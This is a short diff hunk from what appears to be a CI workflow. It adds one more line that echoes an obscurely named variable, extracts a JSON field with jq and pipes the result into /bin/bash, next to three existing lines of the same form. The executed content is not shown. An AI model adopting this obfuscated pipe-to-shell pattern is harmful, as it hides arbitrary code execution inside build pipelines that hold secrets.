@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$rd9497" | jq -r .swdr8 | /bin/bash
           echo $ygrf684 | jq -r .vbfcx4476 | /bin/bash
           echo $yjmk5086 | jq -r .f3 | /bin/bash
+          echo $j806 | jq -r .wtsac4489 | /bin/bash
 
       - name: Save archive
         if: always()
